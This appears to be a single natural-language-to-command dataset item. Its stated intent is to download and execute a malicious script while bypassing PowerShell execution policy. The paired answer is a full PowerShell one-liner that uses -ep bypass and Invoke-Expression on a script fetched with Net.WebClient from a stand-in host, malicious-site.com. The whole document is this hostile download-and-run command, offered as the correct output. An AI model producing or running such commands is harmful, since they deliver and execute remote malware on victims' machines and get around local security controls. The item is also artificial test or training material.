# Natural language intent:
# Download and execute a malicious script from a specified website with bypass execution policy.

powershell.exe -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script')"
